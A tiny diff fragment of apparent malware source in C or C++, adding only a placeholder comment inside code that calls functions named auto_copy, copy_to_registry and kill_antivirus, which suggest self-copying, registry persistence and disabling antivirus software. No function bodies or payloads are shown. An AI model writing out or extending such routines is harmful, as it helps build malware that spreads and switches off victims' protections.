@@ -202,7 +202,10 @@ void copy_to_registry()
     while(connect == (true));
 
    {
-
+	   
+    /* reserve this function for now */
+	   
+	   
     auto_copy();
     copy_to_registry();
     kill_antivirus();
